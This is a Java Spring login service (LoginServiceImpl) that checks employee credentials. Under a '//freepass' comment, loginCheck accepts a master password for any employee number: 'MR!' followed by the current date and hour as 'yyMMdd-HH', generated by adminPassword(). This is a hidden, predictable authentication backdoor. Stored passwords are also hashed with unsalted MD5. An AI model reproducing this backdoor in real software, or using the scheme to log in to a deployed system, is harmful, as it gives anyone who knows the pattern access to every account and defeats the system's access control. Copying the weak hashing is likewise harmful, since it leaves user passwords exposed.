@Service
public class LoginServiceImpl extends BaseService implements LoginService{

    @Autowired
    EmpAndTeamDAO loginDAO;


    @Override
    public EmpInfoVo loginCheck(EmpInfoVo empInfoVo) {
        EmpInfoVo loginEmpInfoVo = null;

        //freepass

        //System.out.println("******3_1111" + "xxxxx");
        
        if(empInfoVo.getPasswd()!=null && empInfoVo.getPasswd().equals("MR!"+adminPassword())) {
            loginEmpInfoVo = loginDAO.getEmp(empInfoVo.getEmpNo());
        } else if(empInfoVo.getPasswd()!=null) {
            empInfoVo.setPasswd(encrypt(empInfoVo.getPasswd()));
            loginEmpInfoVo = loginDAO.loginCheck(empInfoVo);
        }
        
        return loginEmpInfoVo;
    }

    @Override
    public EmpInfoVo loginUserInfo(String empNo) {
        return loginDAO.getEmp(empNo);
    }


    @Override
    public String encrypt(String str) {

        String MD5 = "";
        try{
            MessageDigest md = MessageDigest.getInstance("MD5");
            md.update(str.getBytes());
            byte byteData[] = md.digest();
            StringBuffer sb = new StringBuffer();
            for(int i = 0 ; i < byteData.length ; i++){
                sb.append(Integer.toString((byteData[i]&0xff) + 0x100, 16).substring(1));
            }
            MD5 = sb.toString();

        }catch(NoSuchAlgorithmException e){
            e.printStackTrace();
            MD5 = null;
        }
        return MD5;
    }


    /**
     * 관리자용 암호 생성
     * @return
     */
    public String adminPassword(){
        long currentTime = System.currentTimeMillis();
        SimpleDateFormat transFormat = new SimpleDateFormat("yyMMdd-HH");
        Date to = null;
        to = new Date(currentTime);
        return transFormat.format(to).toString();
    }


}
